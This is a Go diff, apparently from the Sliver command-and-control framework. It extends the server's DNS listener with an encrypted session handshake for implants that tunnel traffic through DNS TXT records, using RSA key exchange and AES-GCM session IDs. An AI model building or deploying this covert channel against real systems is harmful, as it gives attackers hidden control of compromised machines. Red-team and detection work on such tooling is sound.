@@ -2,11 +2,15 @@ package main
 
 import (
 	"bytes"
+	"crypto/x509"
+	"encoding/base32"
 	"encoding/base64"
 	"encoding/binary"
+	"encoding/pem"
 	"fmt"
 	"log"
 	insecureRand "math/rand"
+	"sliver/server/cryptography"
 	"strconv"
 	"strings"
 	"sync"
@@ -15,29 +19,47 @@ import (
 	"github.com/miekg/dns"
 )
 
+const (
+	domainKeyMsg  = "_domainkey"
+	blockReqMsg   = "_b"
+	clearBlockMsg = "_cb"
+
+	sessionInitMsg    = "_si"
+	sessionCleanupMsg = "_sc"
+	sessionMsg        = "s"
+	sessionHeaderMsg  = "_sh"
+	sessionPollingMsg = "_sp"
+
+	sessionIDSize = 8
+
+	// Max TXT record is 255, so (n*8 + 5) / 6 = ~250 (250 bytes per block + 4 byte sequence number)
+	byteBlockSize = 185 // Can be as high as n = 187, but we'll leave some slop
+
+	blockIDSize = 6
+)
+
+var (
+	dnsCharSet = []rune("abcdefghijklmnopqrstuvwxyz0123456789-_")
+
+	sendBlocksMutex = &sync.RWMutex{}
+	sendBlocks      = &map[string]*SendBlock{}
+
+	dnsSessionsMutex = &sync.RWMutex{}
+	dnsSessions      = &map[string]*DNSSession{}
+)
+
 // SendBlock - Data is encoded and split into `Blocks`
 type SendBlock struct {
 	ID   string
 	Data []string
 }
 
-const (
-	domainKeyMsg = "_domainkey"
-	blockReqMsg = "_b"
-	clearBlockMsg = "_cb"
-	sessionInitMsg = "_si"
-)
-
-var (
-	dnsCharSet = []rune("abcdefghijklmnopqrstuvwxyz0123456789-_")
-
-	// Max TXT record is 255, so (n*8 + 5) / 6 = ~250 (250 bytes per block + 4 byte sequence number)
-	byteBlockSize = 185 // Can be as high as n = 187, but we'll leave some slop
-
-	blockIDSize     = 6
-	sendBlocksMutex = &sync.RWMutex{}
-	sendBlocks      = &map[string]*SendBlock{}
-)
+// DNSSession - Holds DNS session information
+type DNSSession struct {
+	SliverName  string
+	Key         cryptography.AESKey
+	LastCheckin time.Duration
+}
 
 func startDNSListener(domain string) *dns.Server {
 
@@ -111,7 +133,14 @@ func handleTXT(domain string, subdomain string, req *dns.Msg) *dns.Msg {
 		}
 	case sessionInitMsg: // Session init: _(nonce).(session key).(sliver name)._si.example.com
 		if len(fields) == 4 {
-
+			encryptedSessionKey := fields[1]
+			sliverName := fields[2]
+			encryptedSessionID, _ := startDNSSession(domain, encryptedSessionKey, sliverName)
+			txt := &dns.TXT{
+				Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 0},
+				Txt: []string{encryptedSessionID},
+			}
+			resp.Answer = append(resp.Answer, txt)
 		}
 	case clearBlockMsg: // Clear block: _(nonce).(block id)._cb.example.com
 		if len(fields) == 3 {
@@ -134,8 +163,28 @@ func handleTXT(domain string, subdomain string, req *dns.Msg) *dns.Msg {
 	return resp
 }
 
+func startDNSSession(domain string, encryptedSessionKey string, sliverName string) (string, error) {
+	_, privateKeyPEM, err := GetServerRSACertificatePEM("slivers-rsa", domain)
+	if err != nil {
+		log.Printf("Failed to fetch RSA key pair %v", err)
+		return "", err
+	}
+	privateKeyBlock, _ := pem.Decode([]byte(privateKeyPEM))
+	privateKey, _ := x509.ParsePKCS1PrivateKey(privateKeyBlock.Bytes)
+	sessionKey, err := cryptography.RSADecrypt([]byte(encryptedSessionKey), privateKey)
+	if err != nil {
+		log.Printf("Failed to decrypt RSA message %v", err)
+		return "", err
+	}
+	sessionID := dnsSessionID()
+	aesSessionKey, _ := cryptography.AESKeyFromBytes(sessionKey)
+	encryptedSessionID, _ := cryptography.GCMEncrypt(aesSessionKey, []byte(sessionID))
+	encodedSessionID := base32.StdEncoding.EncodeToString(encryptedSessionID)
+	return encodedSessionID, nil
+}
+
 func getDomainKeyFor(domain string) (string, int) {
-	certPEM, _, _ := GetServerRSACertificatePEM("slivers", domain)
+	certPEM, _, _ := GetServerRSACertificatePEM("slivers-rsa", domain)
 	blockID, blockSize := storeSendBlocks(certPEM)
 	log.Printf("Encoded cert into %d blocks with ID = %s", blockSize, blockID)
 	return blockID, blockSize
@@ -219,4 +268,16 @@ func generateBlockID() string {
 		blockID = append(blockID, dnsCharSet[index])
 	}
 	return string(blockID)
+}
+
+// SessionIDs are public parameters in this use case
+// so it's only important that they're unique
+func dnsSessionID() string {
+	insecureRand.Seed(time.Now().UnixNano())
+	sessionID := []rune{}
+	for i := 0; i < sessionIDSize; i++ {
+		index := insecureRand.Intn(len(dnsCharSet))
+		sessionID = append(sessionID, dnsCharSet[index])
+	}
+	return "_" + string(sessionID)
 }
